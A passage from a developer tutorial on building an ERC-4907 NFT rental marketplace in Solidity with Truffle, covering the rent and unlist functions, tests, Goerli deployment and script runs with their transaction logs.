standard either. In that case, we want to gracefully fail and exit. This method is public because we intend to call it in our frontend later to check for NFT validity. Finally, listNFT simply transfers the listing fee over to the marketplace owner, and stores the relevant listing info. Note that the user is first set to the zero address and expires is set to 0 since no one has rented the NFT yet. Do notice that we marked the function as nonReentrant , which is a modifier inherited from ReentrancyGuard to protect against reentrancy attacks, and payable , which ensures the function can send and receive ETH. Write rentNFT() \u00b6 // function to rent an NFT function rentNFT ( address nftContract , uint256 tokenId , uint64 expires ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . user == address ( 0 ), \"NFT already rented\" ); require ( expires <= listing . endDateUNIX , \"Rental period exceeds max date rentable\" ); // Transfer rental fee uint256 numDays = ( expires - block . timestamp ) / 60 / 60 / 24 + 1 ; uint256 rentalFee = listing . pricePerDay * numDays ; require ( msg . value >= rentalFee , \"Not enough ether to cover rental period\" ); payable ( listing . owner ). transfer ( rentalFee ); // Update listing IERC4907 ( nftContract ). setUser ( tokenId , msg . sender , expires ); listing . user = msg . sender ; listing . expires = expires ; emit NFTRented ( IERC721 ( nftContract ). ownerOf ( tokenId ), msg . sender , nftContract , tokenId , listing . startDateUNIX , listing . endDateUNIX , expires , rentalFee ); } This function handles the actual renting logic! We first grab the listing information and declare it as storage , since we want to modify contract state when we edit it. Again, we make some checks beforehand to ensure that the NFT can be rented, and the user has enough ETH to do so. For this dapp, we assume the rental period starts right away. There is no ability to reserve NFTs later on. To calculate the number of days in a rental period, we add 1, because Solidity rounds down in integer division. After transferring the rental fee, we call setUser so that other dapps can check rental information on the NFT. It is important to note that setUser requires that the Marketplace contract has approval to do so (if you recall from the implementation of it in episode 2). When we call this contract method in our dapp, we need to first call the ERC721 approve method to give it permission to do so. Otherwise, this transaction will fail. Write unlistNFT() \u00b6 unlistNFT allows the owner of the NFT to take down their listing. However, if they choose to do so while an NFT is still being rented, they must refund the user the appropriate amount for the days lost. // function to unlist your rental, refunding the user for any lost time function unlistNFT ( address nftContract , uint256 tokenId ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . owner != address ( 0 ), \"This NFT is not listed\" ); require ( listing . owner == msg . sender || _marketOwner == msg . sender , \"Not approved to unlist NFT\" ); // fee to be returned to user if unlisted before rental period is up uint256 refund = (( listing . expires - block . timestamp ) / 60 / 60 / 24 + 1 ) * listing . pricePerDay ; require ( msg . value >= refund , \"Not enough ether to cover refund\" ); payable ( listing . user ). transfer ( refund ); // clean up data IERC4907 ( nftContract ). setUser ( tokenId , address ( 0 ), 0 ); EnumerableSet . remove ( _nftContractTokensMap [ nftContract ], tokenId ); delete _listingMap [ nftContract ][ tokenId ]; if ( EnumerableSet . length ( _nftContractTokensMap [ nftContract ]) == 0 ) { EnumerableSet . remove ( _nftContracts , nftContract ); } _nftsListed . decrement (); emit NFTUnlisted ( msg . sender , nftContract , tokenId , refund ); } Again, we validate that: The NFT is listed Only the owner or marketplace owner can unlist an NFT Enough ETH is available to refund the user At the end, we want to clean up our data, which entails: Removing the rental info from the NFT Removing the NFT from the stored listings Write getAllListings() \u00b6 This function returns all the listings stored, regardless of whether or not the rental period has expired or the time is not within startDateUNIX and endDateUNIX. While this is possible to do in Solidity, this kind of filtering should be handled off-chain to reduce gas costs. /* * function to get all listings * * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that * this function has an unbounded cost, and using it as part of a state-changing function may render the function * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block. */ function getAllListings () public view returns ( Listing [] memory ) { Listing [] memory listings = new Listing []( _nftsListed . current ()); uint256 listingsIndex = 0 ; address [] memory nftContracts = EnumerableSet . values ( _nftContracts ); for ( uint i = 0 ; i < nftContracts . length ; i ++ ) { address nftAddress = nftContracts [ i ]; uint256 [] memory tokens = EnumerableSet . values ( _nftContractTokensMap [ nftAddress ]); for ( uint j = 0 ; j < tokens . length ; j ++ ) { listings [ listingsIndex ] = _listingMap [ nftAddress ][ tokens [ j ]]; listingsIndex ++ ; } } return listings ; } As mentioned before, Solidity maps are not iterable. In order to get around it, we store the keys we want to step over in two separate arrays. Given this is an unbounded list, be careful not to call this in the context of a state change. Otherwise, the computational costs could get very high and the transaction would fail due to gas costs. Write getListingFee() \u00b6 Finally, we have a simple helper function to expose the listing fee in our tests and scripts. function getListingFee () public view returns ( uint256 ) { return _listingFee ; } Modify RentableNft \u00b6 There's actually one last piece we need to handle! For our marketplace smart contract, we want to give it automatic approval for NFTs minted from the RentableNFT contract. To do so, we need to pass in the marketplace contract address to RentableNFT and set the approval in the mint function. Modify the constructor and contract variables in RentableNft : contract RentableNft is ERC4907 { using Counters for Counters . Counter ; address private _marketplaceContract ; Counters . Counter private _tokenIds ; constructor ( address marketplaceContract ) ERC4907 ( \"RentableNft\" , \"RNFT\" ) { _marketplaceContract = marketplaceContract ; } Lastly, modify mint to set the approval: function mint ( string memory _tokenURI ) public { _tokenIds . increment (); uint256 newTokenId = _tokenIds . current (); _safeMint ( msg . sender , newTokenId ); setApprovalForAll ( _marketplaceContract , true ); _setTokenURI ( newTokenId , _tokenURI ); } Modify 1_deploy_contract.js \u00b6 Now, we need to deploy our Marketplace contract, passing in its address to the RentableNft constructor to set approvals. Your migration file should look like this: const RentableNft = artifacts . require ( \"RentableNft\" ); const Marketplace = artifacts . require ( \"Marketplace\" ); module . exports = async function ( deployer ) { await deployer . deploy ( Marketplace ); const marketplace = await Marketplace . deployed (); await deployer . deploy ( RentableNft , marketplace . address ); }; Write Tests \u00b6 Our marketplace contract is done! Now, it's time to write tests. truffle create test TestMarketplace Your completed test should look like this: require ( \"@openzeppelin/test-helpers/configure\" )({ provider : web3 . currentProvider , singletons : { abstraction : \"truffle\" , }, }); const { balance , constants , ether , expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const Marketplace = artifacts . require ( \"Marketplace\" ); const RentableNft = artifacts . require ( \"RentableNft\" ); const TODAY = Math . floor ( Date . now () / 1000 ); const TODAY_2 = TODAY + ( 60 * 60 ); const YESTERDAY = TODAY - ( 24 * 60 * 60 ); const TOMORROW = TODAY + ( 24 * 60 * 60 ); const IN_FIVE_DAYS = TODAY + ( 24 * 60 * 60 * 5 ); function assertListing ( actual , expected ) { assert . equal ( actual . owner , expected . owner , \"Owner is not correct\" ); assert . equal ( actual . user , expected . user , \"User is not correct\" ); assert . equal ( actual . nftContract , expected . nftContract , \"NFT contract is not correct\" ); assert . equal ( actual . tokenId , expected . tokenId , \"TokenId is not correct\" ); assert . equal ( actual . pricePerDay , expected . pricePerDay , \"Price per day is not correct\" ); assert . equal ( actual . startDateUNIX , expected . startDateUNIX , \"Start date is not correct\" ); assert . equal ( actual . endDateUNIX , expected . endDateUNIX , \"End date is not correct\" ); assert . equal ( actual . expires , expected . expires , \"Expires date is not correct\" ); } async function assertNFT ( nftContractInstance , tokenId , expectedUser , expectedExpires ) { let user = await nftContractInstance . userOf . call ( tokenId ); let expires = await nftContractInstance . userExpires . call ( tokenId ); assert . equal ( user , expectedUser , \"User is not correct\" ); assert . equal ( expires , expectedExpires , \"Expires date is incorrect\" ); } // EnumerableSet makes no guarantee about ordering, so we have to find the matching tokenId function getListing ( listings , tokenId ) { let listing = {}; listings . every (( _listing ) => { if ( _listing . tokenId == tokenId ) { listing = _listing ; return false ; } else { return true ; } }); return listing } function listingToString ( listing ) { let listingCopy = {... listing }; listingCopy . tokenId = listing . tokenId . toString (); listingCopy . pricePerDay = listing . pricePerDay . toString (); listingCopy . startDateUNIX = listing . startDateUNIX . toString (); listingCopy . endDateUNIX = listing . endDateUNIX . toString (); listingCopy . expires = listing . expires . toString (); if ( \"rentalFee\" in listing ) { listingCopy . rentalFee = listing . rentalFee . toString (); } } contract ( \"Marketplace\" , function ( accounts ) { const MARKETPLACE_OWNER = accounts [ 0 ]; const TOKEN_OWNER = accounts [ 1 ]; const USER = accounts [ 2 ]; let marketplace ; let rentableNft ; let nftContract ; let listingFee ; let tokenID1 ; let tokenID2 ; let tokenID3 ; before ( 'should reuse variables' , async () => { marketplace = await Marketplace . deployed (); rentableNft = await RentableNft . deployed (); nftContract = rentableNft . address ; listingFee = ( await marketplace . getListingFee ()). toString (); // mint nfts for testing tokenID1 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); tokenID2 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); tokenID3 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); }); it ( \"should list nfts\" , async function () { let tracker = await balance . tracker ( MARKETPLACE_OWNER ); await tracker . get (); let txn = await marketplace . listNFT ( nftContract , tokenID1 , ether ( \"1\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); assert . equal ( await tracker . delta (), listingFee , \"Listing fee not transferred\" ); let expectedListing = { owner : TOKEN_OWNER , user : constants . ZERO_ADDRESS , nftContract : nftContract , tokenId : tokenID1 , pricePerDay : ether ( \"1\" ), startDateUNIX : TOMORROW , endDateUNIX : IN_FIVE_DAYS , expires : 0 }; assertListing ( getListing ( await marketplace . getAllListings . call (), tokenID1 ), expectedListing ); expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); await tracker . get (); txn = await marketplace . listNFT ( nftContract , tokenID2 , ether ( \".5\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); assert . equal ( await tracker . delta (), listingFee , \"Listing fee not transferred\" ); expectedListing . tokenId = tokenID2 ; expectedListing . pricePerDay = ether ( \".5\" ); expectedListing . startDateUNIX = TOMORROW ; expectedListing . endDateUNIX = IN_FIVE_DAYS ; expectedListing . expires = 0 ; assertListing ( getListing ( await marketplace . getAllListings . call (), tokenID2 ), expectedListing ); expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); }); it ( \"should validate listings\" , async function () { await expectRevert ( marketplace . listNFT ( marketplace . address , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Contract is not an ERC4907\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : accounts [ 2 ], value : listingFee }), \"Not owner of nft\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER }), \"Not enough ether for listing fee\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 0 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Rental price should be greater than 0\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , YESTERDAY , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Start date cannot be in the past\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , IN_FIVE_DAYS , YESTERDAY , { from : TOKEN_OWNER , value : listingFee }), \"End date cannot be before the start date\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"This NFT has already been listed\" ); }); it ( \"should modify listings and nft contract when nft is rented\" , async function () { assertNFT ( rentableNft , tokenID1 , constants . ZERO_ADDRESS , 0 ); assertNFT ( rentableNft , tokenID2 , constants . ZERO_ADDRESS , 0 ); let tracker = await balance . tracker ( TOKEN_OWNER ); await tracker . get (); let txn = await marketplace . rentNFT ( nftContract , tokenID1 , TODAY_2 , { from : USER , value : ether ( \"1\" )}); // 1 day rental, pricePerDay is 1 assert . equal (( await tracker . delta ()). toString (), ether ( \"1\" ). toString (), \"One day rental fee is not correct\" ); let listing = getListing ( await marketplace . getAllListings . call (), tokenID1 ); let expectedListing = { owner : TOKEN_OWNER , user : USER , nftContract : nftContract , tokenId : tokenID1 , pricePerDay : ether ( \"1\" ), startDateUNIX : TOMORROW , endDateUNIX : IN_FIVE_DAYS , expires : TODAY_2 , rentalFee : 1 }; assertListing ( listing , expectedListing ); assertNFT ( rentableNft , tokenID1 , USER , TODAY_2 ); expectEvent ( txn , \"NFTRented\" , listingToString ( expectedListing )); await tracker . get (); txn = await marketplace . rentNFT ( nftContract , tokenID2 , IN_FIVE_DAYS , { from : USER , value : ether ( \"2.5\" )}); assert . equal (( await tracker . delta ()). toString (), ether ( \"2.5\" ). toString (), \"Five day rental fee is not correct\" ); listing = getListing ( await marketplace . getAllListings . call (), tokenID2 ); expectedListing . tokenId = tokenID2 ; expectedListing . pricePerDay = ether ( \".5\" ); expectedListing . expires = IN_FIVE_DAYS ; expectedListing . rentalFee = ether ( \"2.5\" ); assertListing ( listing , expectedListing ); assertNFT ( rentableNft , tokenID2 , USER , IN_FIVE_DAYS ); expectEvent ( txn , \"NFTRented\" , listingToString ( expectedListing )); }); it ( \"should validate rentals\" , async function () { await expectRevert ( marketplace . rentNFT ( nftContract , tokenID1 , TODAY_2 , { from : USER , value : ether ( \"1\" )}), \"NFT already rented\" ); await marketplace . listNFT ( nftContract , tokenID3 , ether ( \"1\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); await expectRevert ( marketplace . rentNFT ( nftContract , tokenID3 , IN_FIVE_DAYS + 1000 , { from : USER , value : ether ( \"2.5\" )}), \"Rental period exceeds max date rentable\" ); await expectRevert ( marketplace . rentNFT ( nftContract , tokenID3 , TOMORROW , { from : USER }), \"Not enough ether to cover rental period\" ); }); it ( \"should validate unlisting\" , async function () { await expectRevert ( marketplace . unlistNFT ( nftContract , 10000 , { from : TOKEN_OWNER , value : ether ( \"2.5\" )}), \"This NFT is not listed\" ); await expectRevert ( marketplace . unlistNFT ( nftContract , tokenID2 , { from : USER , value : ether ( \"2.5\" )}), \"Not approved to unlist NFT\" ); await expectRevert ( marketplace . unlistNFT ( nftContract , tokenID2 , { from : TOKEN_OWNER }), \"Not enough ether to cover refund\" ); }); it ( \"should refund USER and cleanup listings if unlisted\" , async function () { let tracker = await balance . tracker ( USER ); await tracker . get (); let txn = await marketplace . unlistNFT ( nftContract , tokenID2 , { from : TOKEN_OWNER , value : ether ( \"2.5\" )}); assert . equal (( await tracker . delta ()). toString (), ether ( \"2.5\" ), \"Refunded amount is not correct\" ); let listing = getListing ( await marketplace . getAllListings . call (), tokenID2 ); assert . equal ( Object . keys ( listing ). length , 0 , \"NFT was not unlisted\" ); assertNFT ( rentableNft , tokenID2 , constants . ZERO_ADDRESS , 0 ); expectEvent ( txn , \"NFTUnlisted\" , { unlistSender : TOKEN_OWNER , nftContract : nftContract , tokenId : tokenID2 . toString (), refund : ether ( \"2.5\" ) }); }); }); There is a lot to unpack here, so we'll just cover the highlights. At the top of the file, we declare some constants that will help us write our tests. Additionally, we define helper assertion methods to reduce code duplication in our tests: assertListing asserts that a Listing object is equal to an expected Listing object. assertNFT asserts that the ERC4907 rental info was properly set. getListing returns the listing corresponding to the passed in tokenID in a list of listings. listingToString converts the values of a listing into a string, since expectEvent expects the values of the emitted event to be a string Before the tests run, we first mint 3 NFTs to be used throughout the test. To test that balances were correctly transferred, we use OpenZeppelin's tracker . This is really handy because the prices are reflected in wei, which need to be wrapped in a javascript BigNumber, and tracker takes care of that logic! Run truffle test to check that the tests pass: Contract: Marketplace \u2714 should list nfts ( 473ms ) \u2714 should validate listings ( 400ms ) \u2714 should modify listings and nft contract when nft is rented ( 241ms ) \u2714 should validate rentals ( 149ms ) \u2714 should validate unlisting \u2714 should refund USER and cleanup listings if unlisted ( 54ms ) Contract: RentableNft \u2714 should support the ERC721 and ERC4907 standards \u2714 should not set UserInfo if not the owner ( 48ms ) \u2714 should return the correct UserInfo ( 150ms ) 9 passing ( 2s ) If you run into issues testing, using the Truffle debugger is really helpful! Watch the livestream for help testing reverted transactions! Write Scripts to Test with Deployed Contracts \u00b6 Now that we have our rental marketplace up and running, let's try testing it with a RentablePets contract we previously deployed! We can use ganache forking to mimic the state of the testnet or mainnet and interact with already deployed contracts. Deploy the RentablePets contract to Goerli \u00b6 First, let's deploy the RentablePets contract to Goerli. If you haven't already done so, clone the unleashed_rentable_nft repo . Then, let's deploy it to the Goerli testnet using Truffle dashboard! To do so, let's add our Infura Goerli endpoint to our MetaMask wallet. First get your Infura endpoint from your Infura dashboard, and then navigate to Add Networks in MetaMask. Make sure your MetaMask wallet is connected to goerlidev and run: truffle dashboard truffle migrate --network dashboard This should bring up Truffle dashboard on localhost:24012 and prompt you to sign the deployment. After that's been deployed, now let's verify it! Verify RentablePets \u00b6 Follow these steps (here)[https://github.com/rkalis/truffle-plugin-verify] We recommend verifying with dashboard: truffle run verify RentablePets --network dashboard You might run into issues with the OpenZeppelin contracts being in the node_modules folder. If so, go ahead and copy the necessary ones from node_modules into the contracts folder and change the import paths in RentablePets.sol and ERC4907.sol . Then you'll need to redeploy and follow the verify steps again. If you would like, just clone the verify-contract branch of the unleashed repo instead. Once that's deployed, you should be able to see the contract on etherscan! To read more about verification, see here Mint a RentablePets NFT \u00b6 Now, let's just quickly mint an NFT to list, rent, and unlist in our marketplace! truffle console --network dashboard truffle ( dashboard ) > let rp = await RentablePets.deployed () undefined truffle ( dashboard ) > rp.mint ( \"fakeURI\" ) { tx: '0xcc2787590995afc740a9f87c1878b4be290477959c7556fd94a4743d768359cd' , receipt: { blockHash: '0x2de64b084ed37dccc19eb5c187da01b2c39ec76d761bd8c5180855585cde58c0' , blockNumber: 7551204 , contractAddress: null, cumulativeGasUsed: 578352 , effectiveGasPrice: 2500000010 , from: '0xa31618621805c9215b5ade58eb09dba8f32bbdb8' , gasUsed: 117754 , logs: [ [ Object ] ] , logsBloom: '0x00000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000010000000000000000000000040100000000000000000000000008000000000000000000040000000000000200000000000000020000000000000000000800000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000010000000000000000000060000000000000000000000000000000000000000000004000000000000000000000' , status: true, to: '0x3af089fee468eb7fcf750e929321b0d7f7845f5c' , transactionHash: '0xcc2787590995afc740a9f87c1878b4be290477959c7556fd94a4743d768359cd' , transactionIndex: 12 , type: '0x2' , rawLogs: [ [ Object ] ] } , logs: [ { address: '0x3Af089fee468eb7fcf750e929321b0D7f7845f5C' , blockHash: '0x2de64b084ed37dccc19eb5c187da01b2c39ec76d761bd8c5180855585cde58c0' , blockNumber: 7551204 , logIndex: 5 , removed: false, transactionHash: '0xcc2787590995afc740a9f87c1878b4be290477959c7556fd94a4743d768359cd' , transactionIndex: 12 , id: 'log_8554c89f' , event: 'Transfer' , args: [ Result ] } ] } Start up a forked Ganache instance \u00b6 To list, rent, and unlist this NFT, we'll need two things: A local ganache instance that includes the deployed contract and the mint transaction Access to the account that minted the NFT to set approval for the marketplace We can do so as follows: ganache --fork.url https://goerli.infura.io/v3/[API_KEY] --fork.blockNumber [BLOCK_NUMBER_OF_MINT_TRANSACTION] -u [TOKEN_OWNER_ACCOUNT] --port [PORT_NUMBER] Add this instance to your truffle-config networks: goerlidev : { host : \"127.0.0.1\" , // Localhost (default: none) port : 7545 , // Standard Ethereum port (default: none) network_id : \"*\" , // Any network (default: none) }, Write the list script \u00b6 Create a list.js file under the scripts directory: const Marketplace = artifacts . require ( \"Marketplace\" ); const TODAY = Math . floor ( Date . now () / 1000 ) + ( 60 * 60 ); const TOMORROW = TODAY + ( 24 * 60 * 60 ); const ERC721_ABI = [ { \"inputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"to\" , \"type\" : \"address\" }, { \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"approve\" , \"outputs\" : [], \"stateMutability\" : \"nonpayable\" , \"type\" : \"function\" }, { \"inputs\" : [{ \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"ownerOf\" , \"outputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"owner\" , \"type\" : \"address\" }], \"stateMutability\" : \"view\" , \"type\" : \"function\" } ]; const NFT_CONTRACT = \"NFT_CONTRACT_ADDRESS\" ; const TOKEN_ID = 1 ; const PRICE = 1 ; const START = TODAY ; const END = TOMORROW ; const main = async ( cb ) => { try { const marketplace = await Marketplace . deployed (); const listingFee = ( await marketplace . getListingFee ()). toString (); const nftContract = new web3 . eth . Contract ( ERC721_ABI , NFT_CONTRACT ); const owner = await nftContract . methods . ownerOf ( TOKEN_ID ). call (); let txn = await nftContract . methods . approve ( marketplace . address , TOKEN_ID ). send ({ from : owner }); console . log ( txn ); txn = await marketplace . listNFT ( NFT_CONTRACT , TOKEN_ID , PRICE , START , END , { from : owner , value : listingFee }); console . log ( txn ); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; Replace [NFT_CONTRACT_ADDRESS] with the contract address of your contract on Goerli. Of note here is how we got the contract functions of the nft contract. Namely, we grabbed the functions we needed ( ownerOf and approve from the RentablePets ABI) and passed it into the web3 Contract method: const nftContract = new web3 . eth . Contract ( ERC721_ABI , NFT_CONTRACT ); Let's test it out by calling migrate in the console : truffle console --network goerlidev truffle ( goerlidev ) > migrate Compiling your contracts... =========================== > Compiling ./contracts/ERC4907.sol > Compiling ./contracts/IERC4907.sol > Compiling ./contracts/Marketplace.sol > Compiling ./contracts/RentableNft.sol > Compiling @openzeppelin/contracts/interfaces/IERC165.sol > Compiling @openzeppelin/contracts/interfaces/IERC721.sol > Compiling @openzeppelin/contracts/security/ReentrancyGuard.sol > Compiling @openzeppelin/contracts/token/ERC721/ERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol > Compiling @openzeppelin/contracts/utils/Address.sol > Compiling @openzeppelin/contracts/utils/Context.sol > Compiling @openzeppelin/contracts/utils/Counters.sol > Compiling @openzeppelin/contracts/utils/Strings.sol > Compiling @openzeppelin/contracts/utils/introspection/ERC165.sol > Compiling @openzeppelin/contracts/utils/introspection/IERC165.sol > Compiling @openzeppelin/contracts/utils/structs/EnumerableSet.sol > Artifacts written to /Users/emilylin/dev/rental_marketplace/client/src/contracts > Compiled successfully using: - solc: 0 .8.14+commit.80d49f37.Emscripten.clang Migrations dry-run ( simulation ) =============================== > Network name: 'goerlidev-fork' > Network id: 5 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_contract.js ==================== Deploying 'Marketplace' ----------------------- > block number: 7551207 > block timestamp: 1662611960 > account: 0x766160261b23502C82473Eb5749f47089909dCaa > balance: 999 .993796389977667004 > gas used: 2481444 ( 0x25dd24 ) > gas price: 2 .500000009 gwei > value sent: 0 ETH > total cost: 0 .006203610022332996 ETH Deploying 'RentableNft' ----------------------- > block number: 7551208 > block timestamp: 1662611961 > account: 0x766160261b23502C82473Eb5749f47089909dCaa > balance: 999 .986735529952247908 > gas used: 2824344 ( 0x2b1898 ) > gas price: 2 .500000009 gwei > value sent: 0 ETH > total cost: 0 .007060860025419096 ETH ------------------------------------- > Total cost: 0 .013264470047752092 ETH Summary ======= > Total deployments: 2 > Final cost: 0 .013264470047752092 ETH Starting migrations... ====================== > Network name: 'goerlidev' > Network id: 5 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_contract.js ==================== Deploying 'Marketplace' ----------------------- > transaction hash: 0x903c8b43645caad6cfc7a85946f6166fdd4150d936ed8d75fa0d1db9ba67315e > Blocks: 0 Seconds: 0 > contract address: 0x8f7D9a7EFFAD4d0c93CFdbB8b8A7A0BC1A600baf > block number: 7551206 > block timestamp: 1662611961 > account: 0x766160261b23502C82473Eb5749f47089909dCaa > balance: 999 .993796389977667004 > gas used: 2481444 ( 0x25dd24 ) > gas price: 2 .500000009 gwei > value sent: 0 ETH > total cost: 0 .006203610022332996 ETH Deploying 'RentableNft' ----------------------- > transaction hash: 0x8ebabb1b0d376cbd8dc7d19743bbef4bc4bd1485743f3857b7c2f63c67b39f19 > Blocks: 0 Seconds: 0 > contract address: 0xEdBDba2B0Fc091DC6def14ed727e6Da48a546FA7 > block number: 7551207 > block timestamp: 1662611961 > account: 0x766160261b23502C82473Eb5749f47089909dCaa > balance: 999 .986735529952247908 > gas used: 2824344 ( 0x2b1898 ) > gas price: 2 .500000009 gwei > value sent: 0 ETH > total cost: 0 .007060860025419096 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .013264470047752092 ETH Summary ======= > Total deployments: 4 > Final cost: 0 .026528940095504184 ETH truffle ( goerlidev ) > exec scripts/list.js Using network 'goerlidev' . { transactionHash: '0x0a7744320828e574cb6f359fc48b8b12bb72c96aee0adcf8117615cf04ada6d1' , transactionIndex: 0 , blockNumber: 7551208 , blockHash: '0x155d4646401b1d0b6cb3816c7cf2f2f117a9d628d3be18d95afa306c910b6665' , from: '0xa31618621805c9215b5ade58eb09dba8f32bbdb8' , to: '0x3af089fee468eb7fcf750e929321b0d7f7845f5c' , cumulativeGasUsed: 49236 , gasUsed: 49236 , contractAddress: null, logsBloom: '0x00000000000000200000000000000000000000000000000000000000008000000000000000000000000000000000000000010000000000000000000000240100000020100000000000000000000000000000000000040000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000040000010000000000000000000000000000000000000004000000000000000000000' , status: true, effectiveGasPrice: 2500000009 , type: '0x2' , events: { '0' : { address: '0x3Af089fee468eb7fcf750e929321b0D7f7845f5C' , blockHash: '0x155d4646401b1d0b6cb3816c7cf2f2f117a9d628d3be18d95afa306c910b6665' , blockNumber: 7551208 , logIndex: 0 , removed: false, transactionHash: '0x0a7744320828e574cb6f359fc48b8b12bb72c96aee0adcf8117615cf04ada6d1' , transactionIndex: 0 , id: 'log_ddded61e' , returnValues: Result {} , event: undefined, signature: null, raw: [ Object ] } } } { tx: '0xd0681047e8873ca3265199ac87ebe2fd3c27063ed35850eb31906896670c636a' , receipt: { transactionHash: '0xd0681047e8873ca3265199ac87ebe2fd3c27063ed35850eb31906896670c636a' , transactionIndex: 0 , blockNumber: 7551209 , blockHash: '0xb9908ab4e78e4393c1b3b6c41601b4b2575a6bb57ecfc69b0243476686292e64' , from: '0xa31618621805c9215b5ade58eb09dba8f32bbdb8' , to: '0x8f7d9a7effad4d0c93cfdbb8b8a7a0bc1a600baf' , cumulativeGasUsed: 348370 , gasUsed: 348370 , contractAddress: null, logs: [ [ Object ] ] , logsBloom: '0x00000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000080004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' , status: true, effectiveGasPrice: 2500000008 , type: '0x2' , rawLogs: [ [ Object ] ] } , logs: [ { address: '0x8f7D9a7EFFAD4d0c93CFdbB8b8A7A0BC1A600baf' , blockHash: '0xb9908ab4e78e4393c1b3b6c41601b4b2575a6bb57ecfc69b0243476686292e64' , blockNumber: 7551209 , logIndex: 0 , removed: false, transactionHash: '0xd0681047e8873ca3265199ac87ebe2fd3c27063ed35850eb31906896670c636a' , transactionIndex: 0 , id: 'log_1f383ff1' , event: 'NFTListed' , args: [ Result ] } ] } truffle ( goerlidev ) > We'll be following similar patterns in the following scripts. Write rent.js \u00b6 const Marketplace = artifacts . require ( \"Marketplace\" ); const TODAY = Math . floor ( Date . now () / 1000 ); const TOMORROW = TODAY + ( 24 * 60 * 60 ); const NFT_CONTRACT = \"NFT_CONTRACT\" ; const TOKEN_ID = 1 ; const EXPIRES = TOMORROW ; const PRICE = 1 ; const main = async ( cb ) => { try { const marketplace = await Marketplace . deployed (); let value = (( EXPIRES - TODAY ) / 60 / 60 / 24 + 1 ) * PRICE ; let user = ( await web3 . eth . getAccounts ())[ 0 ]; txn = await marketplace . rentNFT ( NFT_CONTRACT , TOKEN_ID , EXPIRES , { from : user , value : value }); console . log ( txn ); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; truffle ( goerlidev ) > exec scripts/rent.js Using network 'goerlidev' . { tx: '0xc8b9ecaeccdc502ca2c334e2ecafdea17409c631622c8e0c9b26e42ce59f8325' , receipt: { transactionHash: '0xc8b9ecaeccdc502ca2c334e2ecafdea17409c631622c8e0c9b26e42ce59f8325' , transactionIndex: 0 , blockNumber: 7551210 , blockHash: '0x3606594dbcec10924a73112a481fd368257b2a949b9fc1f3cddbbd786ab8f852' , from: '0x766160261b23502c82473eb5749f47089909dcaa' , to: '0x8f7d9a7effad4d0c93cfdbb8b8a7a0bc1a600baf' , cumulativeGasUsed: 130387 , gasUsed: 130387 , contractAddress: null, logs: [ [ Object ] ] , logsBloom: '0x00000000000000000000004001000000000000000000000000000000008000001000000000000000000000000008000000010000000000000000000020040000000000000000000000000000000000000000000000040000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040800000000000000000000000000000000000020000000000000020000000000000000000100000000000000000000000000000000000000000000000000000000000040000000000000800000080000000000000000000000000000000000000000000000' , status: true, effectiveGasPrice: 2500000008 , type: '0x2' , rawLogs: [ [ Object ] , [ Object ] ] } , logs: [ { address: '0x8f7D9a7EFFAD4d0c93CFdbB8b8A7A0BC1A600baf' , blockHash: 